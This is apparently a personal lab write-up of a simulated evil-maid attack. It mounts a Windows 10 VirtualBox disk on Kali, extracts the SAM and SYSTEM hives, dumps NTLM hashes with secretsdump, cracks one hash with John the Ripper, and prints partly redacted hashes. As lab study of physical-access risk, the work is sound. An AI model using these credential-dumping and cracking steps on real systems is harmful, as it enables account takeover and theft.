
### 🎯 Objective:

Simulate a physical post-exploitation (evil maid-style) scenario to extract and crack Windows account password hashes from a VirtualBox `.vdi` disk using a Kali Linux host system.

---

## 🔧 Setup:

- **Host OS**: Kali Linux
    
- **Target**: Windows 10 Virtual Machine (`.vdi` disk image)
    
- **Goal**: Extract SAM & SYSTEM hives → Dump NTLM hashes → Crack or reuse them
    

---

## 🪛 Steps Taken:

### 1. **Connected and Mounted the VDI Disk**

```bash
sudo modprobe nbd max_part=8
sudo qemu-nbd -c /dev/nbd0 "/path/to/win10.vdi"
sudo mount /dev/nbd0p2 /mnt
```

- ⚠️ Warning during mount:
    
    > Metadata kept in Windows cache... fallback to **read-only**
    
- 🔍 Cause: Windows was shut down improperly or with **Fast Startup** enabled (common)

---

### 2. **Extracted SAM and SYSTEM Hives**

```bash
/mnt/Windows/System32/config/SAM
/mnt/Windows/System32/config/SYSTEM
```


### 3. **Dumped Hashes using `samdump2`**

```bash
impacket-secretsdump -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM LOCAL
```

✔️ Successfully dumped NTLM password hashes.


## 🔐 Extracted Hashes (Redacted)


```bash
Administrator:500:aad3...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3...:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:...:31d6cfe...
WDAGUtilityAccount:504:...:3e4545c4166becad7ae7bc00ca8537ea:::
reach:1001:...:920cfb30572d65b8739a2c775b7eeba8:::
```


### 🧠 Password Cracking

**Cracked Hash:**

```bash
john admin.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
✔️ Cracked: Administrator → (password)
```

**Uncracked:**

```bash
john reach.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
❌ Not found in rockyou.txt
```


### Clean up

```bash
sudo umount /mnt
sudo qemu-nbd -d /dev/nbd0
```
## 💡 Observations

- `secretsdump` was more reliable than `samdump2`, especially under read-only conditions.
    
- `31d6cfe...` indicates **no password set**.
    
- Cracked user password confirms **physical access = full access** if no encryption or BIOS lock.
    
- Realistic simulation of **evil maid attack** or **cold forensics** on unencrypted disks.